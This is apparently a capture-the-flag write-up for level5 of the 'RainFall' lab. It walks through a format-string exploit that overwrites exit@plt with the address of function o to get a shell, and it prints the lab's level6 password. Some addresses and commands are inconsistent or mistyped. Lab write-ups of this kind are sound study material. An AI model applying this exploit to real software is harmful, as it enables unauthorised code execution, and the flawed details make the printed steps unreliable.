We can see @plt functions and a function o containing a call to system.
PLT (Procedure Linkage Table) is a table linking functions in a dynamic library. A PLT function will have a different address
depending if it's pre run or post run *0x8049838 (pre-run de exit@plt) with the one from the o function, containing a system call


STEP 1: Find our buffer position
level5@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 [[42424242]] 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520

STEP 2: Remplace with the address we want to write
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%x %x %x %x"' | ./level5
8200 b7fd1ac0 b7ff37d0 [[8049838]]

STEP 3: Write what we want on the adresse we want

(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.

We will use the decimal for of the o address: 0x080484a0 -> 134513824
level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat) | .evel5 | tr -d " "
whoami
level6
pwd
/home/user/level5
cd ..
cd level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

---> This is the End
Cet exercice est similaire au precedent, d'abord on trouve offset